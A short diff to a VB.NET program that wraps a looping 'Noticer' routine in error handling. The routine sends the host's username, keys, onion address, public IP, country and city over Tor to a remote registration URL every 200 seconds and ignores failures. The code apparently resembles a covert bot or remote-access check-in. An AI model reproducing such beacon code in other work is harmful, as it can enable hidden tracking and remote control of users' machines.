@@ -68,18 +68,22 @@ Module Main
     End Sub
     Public Sub Noticer()
         While (True)
-            Dim model As New DefaultRegistrationModel With {
-                .UserName = GetUsername(),
-                .KeyUnique = GetConfigJson().KeyUnique,
-                .KeyCertified = _config.Variables.CertifiedKey,
-                .Domain = GetOnionAddress(),
-                .CountryCode = GetCountyCode(GetMyIPAddress()),
-                .LastIPAddress = GetMyIPAddress(),
-                .City = GetCity(GetMyIPAddress())
-            }
-            Dim http As New SendHTTPonTor
-            http.TalkChannelHTTP(model, _config.UrlVariables.RegistrationUrl)
-            Thread.Sleep(SectoMs(200))
+            Try
+                Dim model As New DefaultRegistrationModel With {
+                                .UserName = GetUsername(),
+                                .KeyUnique = GetConfigJson().KeyUnique,
+                                .KeyCertified = _config.Variables.CertifiedKey,
+                                .Domain = GetOnionAddress(),
+                                .CountryCode = GetCountyCode(GetMyIPAddress()),
+                                .LastIPAddress = GetMyIPAddress(),
+                                .City = GetCity(GetMyIPAddress())
+                            }
+                Dim http As New SendHTTPonTor
+                http.TalkChannelHTTP(model, _config.UrlVariables.RegistrationUrl)
+                Thread.Sleep(SectoMs(200))
+            Catch ex As Exception
+                'Website not working/shutdown
+            End Try
         End While
     End Sub
     Public Sub DelayedActions()
